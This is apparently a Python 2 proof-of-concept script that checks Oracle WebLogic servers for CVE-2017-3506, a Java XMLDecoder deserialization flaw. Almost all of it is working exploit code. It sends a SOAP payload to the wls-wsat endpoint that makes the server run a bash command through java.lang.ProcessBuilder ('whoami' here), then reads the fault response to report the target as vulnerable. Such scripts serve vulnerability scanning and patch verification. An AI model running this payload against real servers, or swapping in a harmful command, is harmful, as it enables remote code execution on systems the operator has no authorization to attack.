#!/usr/bin/env python
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _    
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   < 
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import requests
import re
from sys import argv

heads = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Content-Type': 'text/xml;charset=UTF-8'
    }

def poc(url):
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=heads)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception, e:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        result = u'[+]目标weblogic存在JAVA反序列化漏洞：CVE-2017-3506'
        return result
    else:
        result = u'[-]目标weblogic未检测到CVE-2017-3506'
        return result
def run(rip,rport):
    url=rip+':'+str(rport)
    result = poc(url=url)
    print result

if __name__ == '__main__':
    run('127.0.0.1',7001)